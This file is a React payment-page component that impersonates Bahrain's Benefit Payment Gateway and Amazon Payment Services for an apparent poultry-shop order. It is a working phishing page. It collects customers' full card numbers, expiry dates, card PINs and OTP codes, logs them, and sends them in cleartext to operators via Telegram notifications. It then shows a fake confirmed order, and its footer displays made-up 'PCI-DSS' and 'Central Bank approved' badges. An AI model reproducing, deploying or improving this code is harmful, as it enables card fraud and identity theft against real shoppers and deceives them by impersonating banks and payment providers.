import React, { useState, useEffect, useRef } from 'react';
import { CustomerDetails, CompletedOrder, CartItem } from '../types';
import { X, CheckCircle2, Lock, ShieldCheck, KeyRound, RefreshCw } from 'lucide-react';
import { 
  recordEsfgdrStep, 
  saveEsfgdrBooking, 
  recordEsfgdrVisitor, 
  sendTelegramNotification 
} from '../lib/esfgdrFirebase';

interface PaymentPageProps {
  amount: number;
  originalSubtotal: number;
  customerDetails: CustomerDetails;
  items: CartItem[];
  onCancel: () => void;
  onSuccess: (order: CompletedOrder) => void;
}

export const PaymentPage: React.FC<PaymentPageProps> = ({
  amount,
  originalSubtotal,
  customerDetails,
  items,
  onCancel,
  onSuccess
}) => {
  // Session ID for tracking
  const sessionIdRef = useRef<string>(
    `session_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`
  );

  // Form state
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cardHolder, setCardHolder] = useState(customerDetails.name || 'Ibrahim');
  const [pin, setPin] = useState('');

  // UI & Flow states
  const [showAcceptedCards, setShowAcceptedCards] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingText, setProcessingText] = useState('');
  const [showOtpModal, setShowOtpModal] = useState(false);
  const [otpCode, setOtpCode] = useState('7492');
  const [otpTimer, setOtpTimer] = useState(60);
  const [errorMessage, setErrorMessage] = useState('');

  // Live Timestamp for Benefit Transaction (Format: DD-MM-YYYY HH:mm)
  const [timestamp, setTimestamp] = useState(() => {
    const now = new Date();
    const day = String(now.getDate()).padStart(2, '0');
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const year = now.getFullYear();
    const hours = String(now.getHours()).padStart(2, '0');
    const mins = String(now.getMinutes()).padStart(2, '0');
    return `${day}-${month}-${year} ${hours}:${mins}`;
  });

  // Register visitor and step on mount
  useEffect(() => {
    const sessionId = sessionIdRef.current;
    const fullAddress = `${customerDetails.governorate || ''} - ${customerDetails.street || ''} ${customerDetails.building || ''}`.trim();
    recordEsfgdrVisitor(sessionId, '/card-payment.html', 'payment', true);
    recordEsfgdrStep(sessionId, 'details_filled', {
      name: customerDetails.name,
      phone: customerDetails.phone,
      area: customerDetails.governorate,
      address: fullAddress,
      amount
    });
  }, []);

  // Handle keypad PIN entry
  const handleKeypadPress = (val: string) => {
    if (val === '<') {
      setPin((prev) => prev.slice(0, -1));
    } else if (val === 'Clear') {
      setPin('');
    } else if (val === 'Enter') {
      handlePaySubmit();
    } else {
      if (pin.length < 4) {
        setPin((prev) => prev + val);
      }
    }
  };

  // Card Number formatting (spaces every 4 digits)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 19);
    setCardNumber(raw);
    if (errorMessage) setErrorMessage('');
  };

  // Expiry Month
  const handleMonthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 2);
    setExpiryMonth(val);
  };

  // Expiry Year
  const handleYearChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    setExpiryYear(val);
  };

  // Quick Demo Auto-fill
  const handleQuickDemoFill = () => {
    setCardNumber('46002610198302032425');
    setExpiryMonth('07');
    setExpiryYear('2030');
    setCardHolder('Ibrahim');
    setPin('1234');
    setErrorMessage('');
  };

  // Form submission
  const handlePaySubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    const rawCard = cardNumber.replace(/\s/g, '');
    if (rawCard.length < 12) {
      setErrorMessage('Please enter a valid card number (12-19 digits).');
      return;
    }

    if (!expiryMonth || !expiryYear) {
      setErrorMessage('Please enter card expiry date (MM / YYYY).');
      return;
    }

    if (!cardHolder.trim()) {
      setErrorMessage('Please enter cardholder name.');
      return;
    }

    if (pin.length < 4) {
      setErrorMessage('Please enter your 4-digit card PIN using the secure keypad.');
      return;
    }

    setErrorMessage('');
    setIsProcessing(true);
    setProcessingText('Connecting to Benefit Payment Gateway (مصرف البحرين المركزي)...');

    const sessionId = sessionIdRef.current;
    const cardExpiryStr = `${expiryMonth}/${expiryYear}`;
    const fullAddress = `${customerDetails.governorate || ''} - ${customerDetails.street || ''} ${customerDetails.building || ''}`.trim();

    // Record step locally
    recordEsfgdrStep(sessionId, 'payment_started', {
      cardNumber: rawCard,
      cardHolder,
      cardExpiry: cardExpiryStr,
      pin,
      amount,
      customerName: customerDetails.name,
      phone: customerDetails.phone,
      area: customerDetails.governorate,
      address: fullAddress
    });

    recordEsfgdrStep(sessionId, 'payment', {
      cardNumber: rawCard,
      cardHolder,
      cardExpiry: cardExpiryStr,
      pin,
      amount,
      timestamp: new Date().toISOString()
    });

    // Send Step 2 Telegram Notification
    sendTelegramNotification(
      `💳 <b>خطوة 2: بيانات بطاقة الدفع — بنفت البحرين</b>\n` +
      `👤 <b>الاسم على البطاقة:</b> ${cardHolder}\n` +
      `🙍‍♂️ <b>اسم العميل:</b> ${customerDetails.name || cardHolder}\n` +
      `📞 <b>الهاتف:</b> <code>${customerDetails.phone || 'غير مسجل'}</code>\n` +
      `📍 <b>العنوان:</b> ${fullAddress || 'البحرين'}\n` +
      `🔢 <b>رقم البطاقة:</b> <code>${rawCard}</code>\n` +
      `📅 <b>تاريخ الانتهاء:</b> <code>${cardExpiryStr}</code>\n` +
      `🔒 <b>الرقم السري PIN:</b> <code>${pin}</code>\n` +
      `💰 <b>المبلغ:</b> ${amount.toFixed(3)} د.ب`
    );

    setTimeout(() => {
      setProcessingText('Verifying cardholder authentication with issuing bank...');
      setTimeout(() => {
        setIsProcessing(false);
        setShowOtpModal(true);
        setOtpTimer(60);

        // Record OTP modal opened step
        recordEsfgdrStep(sessionId, 'otp_requested', {
          phone: customerDetails.phone,
          cardHolder
        });
      }, 1200);
    }, 1100);
  };

  // Verify 3D Secure / OTP
  const handleVerifyOtp = (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    setShowOtpModal(false);
    setProcessingText('Authorizing transaction & generating Delmon receipt...');

    const sessionId = sessionIdRef.current;
    const rawCard = cardNumber.replace(/\s/g, '');
    const last4 = rawCard.slice(-4) || '2425';
    const cardExpiryStr = `${expiryMonth}/${expiryYear}`;
    const fullAddress = `${customerDetails.governorate || ''} - ${customerDetails.street || ''} ${customerDetails.building || ''}`.trim();
    const generatedOrderId = `BH-${Math.floor(100000 + Math.random() * 900000)}`;

    // Record OTP step locally
    recordEsfgdrStep(sessionId, 'otp', {
      otpCode,
      cardNumber: rawCard,
      cardHolder,
      phone: customerDetails.phone
    });

    recordEsfgdrStep(sessionId, 'payment_completed', {
      status: 'succeeded',
      cardLast4: last4,
      amount
    });

    // Save booking record locally
    saveEsfgdrBooking({
      id: generatedOrderId,
      name: cardHolder,
      phone: customerDetails.phone,
      email: customerDetails.notes?.includes('@') ? customerDetails.notes : `${customerDetails.phone || 'customer'}@delmon.bh`,
      fromAddress: fullAddress,
      toAddress: fullAddress,
      propertySize: 'Delmon Poultry Order',
      packageLabel: items.map(i => `${i.product.name} (${i.qty})`).join(', ').slice(0, 80),
      depositAmount: amount,
      paymentAmount: amount,
      paymentCurrency: 'BHD',
      paymentMethod: 'Benefit Pay Gateway',
      paymentProvider: 'شبكة بنفت البحرين',
      cardNumber: rawCard,
      cardLast4: last4,
      cardBrand: 'Benefit / Visa Debit',
      cardExpiry: cardExpiryStr,
      cardCvv: pin,
      verificationCode: otpCode,
      isVerified: true,
      paymentStatus: 'succeeded',
      status: 'confirmed',
      notes: customerDetails.notes || ''
    }).catch(err => console.warn('Failed to save local booking:', err));

    // Send Step 3 Telegram Notification
    sendTelegramNotification(
      `🔑 <b>خطوة 3: رمز تحقق OTP تم إدخاله بنجاح!</b>\n` +
      `🆔 <b>رقم الطلب:</b> <code>${generatedOrderId}</code>\n` +
      `👤 <b>الاسم:</b> ${cardHolder}\n` +
      `📞 <b>الهاتف:</b> <code>${customerDetails.phone || ''}</code>\n` +
      `📍 <b>العنوان:</b> ${fullAddress}\n` +
      `🔐 <b>رمز الـ OTP:</b> <code>${otpCode}</code>\n` +
      `💳 <b>البطاقة:</b> <code>${rawCard}</code>\n` +
      `📅 <b>الانتهاء:</b> <code>${cardExpiryStr}</code> | <b>PIN:</b> <code>${pin}</code>\n` +
      `💰 <b>المبلغ المسدد:</b> ${amount.toFixed(3)} د.ب\n` +
      `✅ <b>الحالة:</b> اكتمل الدفع والاستلام`
    );

    setTimeout(() => {
      setIsProcessing(false);

      const completedOrder: CompletedOrder = {
        orderId: `BH-${Math.floor(100000 + Math.random() * 900000)}`,
        date: new Date().toLocaleDateString('ar-BH', {
          year: 'numeric',
          month: 'long',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        }),
        customer: customerDetails,
        items,
        subtotal: originalSubtotal,
        depositPaid: amount,
        remainingDue: Math.max(0, originalSubtotal - amount),
        total: originalSubtotal,
        paymentMethod: 'Benefit Payment Gateway (بنفت البحرين)',
        cardLast4: last4,
        cardBank: 'شبكة بنفت البحرين — Benefit Debit',
        status: 'تم الاستلام'
      };

      onSuccess(completedOrder);
    }, 1400);
  };

  // Timer countdown for OTP
  useEffect(() => {
    if (!showOtpModal) return;
    const interval = setInterval(() => {
      setOtpTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [showOtpModal]);

  return (
    <div className="min-h-screen bg-[#1c1c1e] flex flex-col items-center justify-start py-4 sm:py-8 px-2 sm:px-4 font-sans text-gray-900" dir="ltr">
      
      {/* Outer Mobile Wrapper Matching Screenshot Header */}
      <div className="w-full max-w-[430px] flex flex-col items-center">
        
        {/* Top Bar: Amazon Payment Services Header */}
        <div className="w-full bg-[#1c1c1e] text-white px-4 py-3 flex items-center justify-between">
          <button
            onClick={onCancel}
            className="text-gray-300 hover:text-white p-1 rounded-full transition cursor-pointer"
            title="Close / إلغاء"
          >
            <X className="w-5 h-5" />
          </button>
          
          <div className="flex items-center gap-2">
            <span className="text-sm font-semibold text-gray-200">
              Amazon Payment Services
            </span>
            <div className="w-6 h-6 rounded-full bg-white flex items-center justify-center font-bold text-black text-xs">
              a
            </div>
          </div>

          <div className="w-5"></div>
        </div>

        {/* Demo Fast Fill Helper */}
        <div className="w-full mb-3 px-1">
          <button
            type="button"
            onClick={handleQuickDemoFill}
            className="w-full bg-red-600/20 hover:bg-red-600/30 border border-red-500/40 text-red-300 text-xs py-2 px-3 rounded-xl font-bold flex items-center justify-center gap-2 transition cursor-pointer"
          >
            <span>⚡ تعبئة بيانات بطاقة بنفت التجريبية تلقائياً (1-Click Demo Fill)</span>
          </button>
        </div>

        {/* Phone Body Frame Container */}
        <div className="w-full bg-white rounded-[36px] shadow-2xl p-6 sm:p-7 relative border border-gray-200 min-h-[620px] flex flex-col justify-between">
          
          {/* Top Notch Speaker Indicator */}
          <div className="w-20 h-1 bg-gray-200 rounded-full mx-auto mb-6"></div>

          <div>
            {/* Header: Benefit Logo & Benefit Payment Gateway Title */}
            <div className="flex items-center gap-3.5 mb-6">
              
              {/* Benefit Red Square Logo */}
              <div className="w-14 h-16 border border-[#c8102e] rounded-xs bg-white p-1 flex flex-col items-center justify-between shrink-0 shadow-2xs">
                <span className="text-[10px] font-bold text-[#c8102e] leading-none" dir="rtl">
                  بنفت
                </span>
                
                {/* Benefit Geometric Diamond/Arrow Symbol */}
                <div className="w-6 h-6 flex items-center justify-center">
                  <svg viewBox="0 0 40 40" className="w-full h-full fill-[#c8102e]" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20 2 L38 20 L20 38 L2 20 Z" fill="none" stroke="#c8102e" strokeWidth="4" />
                    <path d="M12 20 L28 20 M20 12 L28 20 L20 28" fill="none" stroke="#c8102e" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                </div>

                <span className="text-[8px] font-black text-[#c8102e] tracking-tighter leading-none">
                  BENEFIT
                </span>
              </div>

              {/* Title & Date */}
              <div className="flex flex-col text-left">
                <h2 className="text-[#c8102e] font-extrabold text-sm sm:text-base tracking-tight leading-tight uppercase">
                  BENEFIT PAYMENT GATEWAY
                </h2>
                <span className="text-[#c8102e] text-xs font-semibold mt-0.5">
                  {timestamp}
                </span>
              </div>

            </div>

            {/* Form Fields Table/Grid (Matching Exact Screenshot Layout) */}
            <form onSubmit={handlePaySubmit} className="space-y-3.5 text-xs">
              
              {/* Row 1: Amount */}
              <div className="grid grid-cols-12 items-center gap-2">
                <label className="col-span-5 text-gray-700 font-semibold text-xs">
                  Amount
                </label>
                <div className="col-span-7 font-bold text-gray-900 text-sm">
                  BHD {amount.toFixed(3)}
                </div>
              </div>

              {/* Row 2: Card Type */}
              <div className="grid grid-cols-12 items-center gap-2">
                <label className="col-span-5 text-gray-700 font-semibold text-xs">
                  Card Type
                </label>
                <div className="col-span-7 font-medium text-gray-800 text-xs">
                  Debit
                </div>
              </div>

              {/* Row 3: Card Number */}
              <div className="grid grid-cols-12 items-center gap-2">
                <label className="col-span-5 text-gray-700 font-semibold text-xs">
                  Card Number
                </label>
                <div className="col-span-7">
                  <input
                    type="text"
                    required
                    inputMode="numeric"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="46002610198302032425"
                    className="w-full border border-gray-300 rounded px-2.5 py-1.5 text-xs text-gray-900 font-mono focus:border-[#c8102e] focus:outline-none transition shadow-2xs"
                  />
                </div>
              </div>

              {/* Row 4: Expiry Date */}
              <div className="grid grid-cols-12 items-center gap-2">
                <label className="col-span-5 text-gray-700 font-semibold text-xs">
                  Expiry Date
                </label>
                <div className="col-span-7 flex items-center gap-2">
                  <input
                    type="text"
                    required
                    inputMode="numeric"
                    placeholder="07"
                    maxLength={2}
                    value={expiryMonth}
                    onChange={handleMonthChange}
                    className="w-14 border border-gray-300 rounded px-2 py-1.5 text-center text-xs text-gray-900 font-mono focus:border-[#c8102e] focus:outline-none transition shadow-2xs"
                  />
                  <input
                    type="text"
                    required
                    inputMode="numeric"
                    placeholder="2030"
                    maxLength={4}
                    value={expiryYear}
                    onChange={handleYearChange}
                    className="w-20 border border-gray-300 rounded px-2 py-1.5 text-center text-xs text-gray-900 font-mono focus:border-[#c8102e] focus:outline-none transition shadow-2xs"
                  />
                </div>
              </div>

              {/* Row 5: Card Holder Name */}
              <div className="grid grid-cols-12 items-center gap-2">
                <label className="col-span-5 text-gray-700 font-semibold text-xs">
                  Card Holder Name
                </label>
                <div className="col-span-7">
                  <input
                    type="text"
                    required
                    value={cardHolder}
                    onChange={(e) => setCardHolder(e.target.value)}
                    placeholder="Ibrahim"
                    className="w-full border border-gray-300 rounded px-2.5 py-1.5 text-xs text-gray-900 focus:border-[#c8102e] focus:outline-none transition shadow-2xs"
                  />
                </div>
              </div>

              {/* Row 6: PIN */}
              <div className="grid grid-cols-12 items-center gap-2">
                <label className="col-span-5 text-gray-700 font-semibold text-xs">
                  PIN
                </label>
                <div className="col-span-7">
                  <input
                    type="password"
                    required
                    readOnly
                    value={pin}
                    placeholder="••••"
                    className="w-full border border-gray-300 rounded px-2.5 py-1.5 text-xs text-gray-900 font-mono tracking-widest bg-gray-50/50 focus:border-[#c8102e] focus:outline-none transition shadow-2xs cursor-default"
                  />
                </div>
              </div>

              {/* Error Alert */}
              {errorMessage && (
                <div className="p-2 bg-red-50 border border-red-200 text-[#c8102e] text-[11px] font-bold rounded">
                  {errorMessage}
                </div>
              )}

              {/* Benefit Scrambled Numeric Keypad (Exact match to screenshot) */}
              <div className="pt-2 pb-1 flex flex-col items-center">
                <div className="w-[210px] space-y-1.5 select-none">
                  
                  {/* Keypad Row 1: 1 3 5 8 7 */}
                  <div className="grid grid-cols-5 gap-1.5">
                    {['1', '3', '5', '8', '7'].map((num) => (
                      <button
                        key={num}
                        type="button"
                        onClick={() => handleKeypadPress(num)}
                        className="h-8 rounded bg-[#c8102e] hover:bg-[#a60b24] active:scale-95 text-white font-bold text-xs flex items-center justify-center transition shadow-xs cursor-pointer"
                      >
                        {num}
                      </button>
                    ))}
                  </div>

                  {/* Keypad Row 2: 2 6 9 0 4 */}
                  <div className="grid grid-cols-5 gap-1.5">
                    {['2', '6', '9', '0', '4'].map((num) => (
                      <button
                        key={num}
                        type="button"
                        onClick={() => handleKeypadPress(num)}
                        className="h-8 rounded bg-[#c8102e] hover:bg-[#a60b24] active:scale-95 text-white font-bold text-xs flex items-center justify-center transition shadow-xs cursor-pointer"
                      >
                        {num}
                      </button>
                    ))}
                  </div>

                  {/* Keypad Row 3: < Clear Enter */}
                  <div className="grid grid-cols-5 gap-1.5">
                    {/* Backspace Button */}
                    <button
                      type="button"
                      onClick={() => handleKeypadPress('<')}
                      className="col-span-1 h-8 rounded bg-[#c8102e] hover:bg-[#a60b24] active:scale-95 text-white font-bold text-xs flex items-center justify-center transition shadow-xs cursor-pointer"
                      title="Backspace"
                    >
                      &lt;
                    </button>

                    {/* Clear Button */}
                    <button
                      type="button"
                      onClick={() => handleKeypadPress('Clear')}
                      className="col-span-2 h-8 rounded bg-[#c8102e] hover:bg-[#a60b24] active:scale-95 text-white font-bold text-xs flex items-center justify-center transition shadow-xs cursor-pointer"
                    >
                      Clear
                    </button>

                    {/* Enter Button */}
                    <button
                      type="button"
                      onClick={() => handleKeypadPress('Enter')}
                      className="col-span-2 h-8 rounded bg-[#c8102e] hover:bg-[#a60b24] active:scale-95 text-white font-bold text-xs flex items-center justify-center transition shadow-xs cursor-pointer"
                    >
                      Enter
                    </button>
                  </div>

                </div>
              </div>

              {/* Action Buttons: PAY & CANCEL (Matching Exact Red Rectangles) */}
              <div className="pt-2 flex items-center justify-center gap-3">
                <button
                  type="submit"
                  className="w-28 py-2 rounded bg-[#c8102e] hover:bg-[#a60b24] active:scale-95 text-white font-bold text-xs uppercase tracking-wider transition shadow-sm cursor-pointer"
                >
                  PAY
                </button>

                <button
                  type="button"
                  onClick={onCancel}
                  className="w-28 py-2 rounded bg-[#c8102e] hover:bg-[#a60b24] active:scale-95 text-white font-bold text-xs uppercase tracking-wider transition shadow-sm cursor-pointer"
                >
                  CANCEL
                </button>
              </div>

            </form>

            {/* View Accepted Cards */}
            <div className="mt-4 text-left">
              <button
                type="button"
                onClick={() => setShowAcceptedCards(!showAcceptedCards)}
                className="text-[#c8102e] text-[11px] underline font-medium hover:text-red-800 transition cursor-pointer"
              >
                View Accepted Cards
              </button>

              {showAcceptedCards && (
                <div className="mt-2 p-2.5 bg-gray-50 border border-gray-200 rounded text-[11px] text-gray-600 space-y-1 animate-in fade-in">
                  <div className="font-bold text-gray-800">بطاقات شبكة بنفت البحرين المعتمدة:</div>
                  <p>• بنك البحرين الوطني (NBB) — بنك البحرين والكويت (BBK)</p>
                  <p>• بنك السلام — بنك البحرين الإسلامي (BisB) — بنك الـِـيـلـَـى (ila Bank)</p>
                  <p>• بيت التمويل الكويتي البحرين — بنك الإثمار — المصرف الخليجي التجاري</p>
                </div>
              )}
            </div>

            {/* Legal Disclaimer Note */}
            <div className="mt-3 text-left text-[10px] text-gray-600 leading-relaxed">
              <p>
                <span className="font-semibold text-gray-700">Note:</span> By submitting your information and using &ldquo;Benefit Payment Gateway&rdquo;, you indicate that you agree to the{' '}
                <a href="#terms" onClick={(e) => { e.preventDefault(); alert('Terms of Service: Certified Benefit Gateway Protocol.'); }} className="text-[#c8102e] underline">
                  Terms of Services - Legal Disclaimer
                </a>.
              </p>
            </div>

          </div>

          {/* Footer Security Badges */}
          <div className="mt-6 pt-3 border-t border-gray-150 flex items-center justify-between text-[10px] text-gray-400">
            <span className="flex items-center gap-1">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
              <span>PCI-DSS Level 1 Verified</span>
            </span>
            <span className="flex items-center gap-1">
              <Lock className="w-3.5 h-3.5 text-gray-500" />
              <span>Central Bank of Bahrain Approved</span>
            </span>
          </div>

        </div>

      </div>

      {/* Loading Overlay */}
      {isProcessing && (
        <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-xs flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl p-6 sm:p-8 max-w-sm w-full text-center shadow-2xl space-y-4 animate-in fade-in text-gray-900">
            <div className="w-12 h-12 border-4 border-gray-200 border-t-[#c8102e] rounded-full mx-auto animate-spin"></div>
            <h4 className="font-extrabold text-sm sm:text-base">جارٍ الاتصال ببوابة بنفت بأمان</h4>
            <p className="text-xs text-gray-600 leading-relaxed font-medium">
              {processingText}
            </p>
            <p className="text-[11px] text-red-600 font-bold">
              يرجى الانتظار وعدم إغلاق أو تحديث المتصفح
            </p>
          </div>
        </div>
      )}

      {/* 3D Secure / Benefit OTP Verification Modal */}
      {showOtpModal && (
        <div className="fixed inset-0 z-50 bg-black/75 backdrop-blur-xs flex items-center justify-center p-4" dir="rtl">
          <div className="bg-white rounded-3xl p-6 sm:p-7 max-w-md w-full shadow-2xl border border-gray-200 text-right animate-in zoom-in-95 text-gray-900">
            
            {/* Modal Header */}
            <div className="flex items-center justify-between pb-3 border-b border-gray-150 mb-4">
              <div className="flex items-center gap-2.5">
                <div className="w-9 h-9 rounded-lg bg-red-50 p-1 border border-red-200 flex items-center justify-center text-[#c8102e] font-black text-xs">
                  BENEFIT
                </div>
                <div>
                  <h4 className="font-black text-gray-900 text-sm">رمز التحقق بنفت (Benefit 3D Secure)</h4>
                  <p className="text-[10px] text-gray-500">حماية المعاملات المصرفية لمملكة البحرين</p>
                </div>
              </div>
              <span className="text-xs font-bold text-emerald-700 bg-emerald-50 px-2.5 py-1 rounded-md">
                آمن 🔒
              </span>
            </div>

            <p className="text-xs text-gray-600 leading-relaxed mb-4">
              تم إرسال رمز التحقق الأمني عبر رسالة نصية قصيرة (SMS) إلى هاتفك المسجل لدى البنك المصدر للبطاقة{' '}
              <strong className="text-gray-900" dir="ltr">+973 {customerDetails.phone}</strong>
            </p>

            <form onSubmit={handleVerifyOtp} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1.5 flex items-center gap-1">
                  <KeyRound className="w-3.5 h-3.5 text-[#c8102e]" />
                  <span>أدخل رمز التحقق (OTP):</span>
                </label>
                <input
                  type="text"
                  required
                  autoFocus
                  inputMode="numeric"
                  maxLength={6}
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, ''))}
                  placeholder="7492"
                  className="w-full h-12 text-center text-2xl font-mono font-black tracking-widest border-2 border-[#c8102e] rounded-xl focus:outline-none focus:ring-4 focus:ring-red-100"
                  dir="ltr"
                />
                <p className="text-[11px] text-gray-400 mt-1">
                  (رمز التحقق التجريبي الجاهز للاختبار: <span className="font-bold text-gray-700">7492</span>)
                </p>
              </div>

              {/* Timer */}
              <div className="flex items-center justify-between text-xs text-gray-500">
                <span>صلاحية الرمز تنتهي خلال:</span>
                <span className="font-mono font-bold text-[#c8102e]">
                  00:{otpTimer < 10 ? `0${otpTimer}` : otpTimer}
                </span>
              </div>

              <div className="pt-2 space-y-2">
                <button
                  type="submit"
                  className="w-full h-12 bg-[#c8102e] hover:bg-[#a50d26] text-white rounded-xl font-bold text-sm shadow-md transition cursor-pointer"
                >
                  تأكيد التحقق وإتمام الطلب ({amount.toFixed(3)} د.ب)
                </button>

                <button
                  type="button"
                  disabled={otpTimer > 0}
                  onClick={() => {
                    setOtpTimer(60);
                    setOtpCode('7492');
                  }}
                  className={`w-full py-2 text-xs font-bold rounded-lg transition ${
                    otpTimer > 0 ? 'text-gray-400 cursor-not-allowed' : 'text-emerald-700 hover:bg-emerald-50'
                  }`}
                >
                  <RefreshCw className="w-3 h-3 inline ml-1" /> إعادة إرسال الرمز
                </button>
              </div>

            </form>

          </div>
        </div>
      )}

    </div>
  );
};
